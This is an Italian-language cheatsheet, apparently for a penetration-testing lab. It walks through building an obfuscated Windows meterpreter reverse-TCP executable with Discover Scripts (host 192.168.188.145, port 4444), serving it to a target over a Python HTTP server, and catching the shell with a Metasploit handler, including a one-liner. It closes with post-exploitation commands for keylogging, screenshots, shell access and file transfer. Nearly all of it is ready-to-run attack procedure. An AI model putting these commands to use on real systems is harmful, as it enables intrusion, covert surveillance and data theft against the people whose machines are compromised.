# cheatsheet

## PREPARAZIONE AMBIENTE (Discover Scripts)

### Installazione e setup
```bash
sudo git clone https://github.com/leebaird/discover /opt/discover/
cd /opt/discover/
sudo ./update.sh
sudo ./discover.sh
```

## GENERAZIONE PAYLOAD & EVASION

### Creazione eseguibile offuscato
```bash
cd /opt/discover/
./discover.sh
```

### Parametri da selezionare nel menu
- 13 (Generate a malicious payload)
- 15 (windows/x64/meterpreter_reverse_tcp)
- 4 (exe)
- LHOST: 192.168.188.145
- LPORT: 4444
- Iterations: 20
- Template: N

## CONSEGNA MALWARE (Delivery)

### Avvio Server Web (Kali Linux)
```bash
cd /root/data/
sudo python3 -m http.server 8001
```

Target: Scaricare il file navigando su http://192.168.188.145:8001

## SFRUTTAMENTO (Metasploit)

### Configurazione Listener (Manuale)
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 192.168.188.145
set LPORT 4444
exploit
```

### Configurazione Listener (One-liner)
```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 192.168.188.145; set LPORT 4444; exploit"
```

## POST-EXPLOITATION (Meterpreter)

### Comandi principali
- sysinfo: Informazioni di sistema
- getuid: Utente corrente
- screenshot: Cattura lo schermo
- keyscan_start / keyscan_dump: Keylogging
- shell: Accesso al prompt dei comandi (CMD)
- upload / download: Trasferimento file

### Gestione sessioni
- CTRL + Z: Mette la sessione in background
- sessions -i 1: Rientra nella sessione 1
- sessions -K: Chiude tutte le sessioni attive
- exit: Chiude la sessione corrente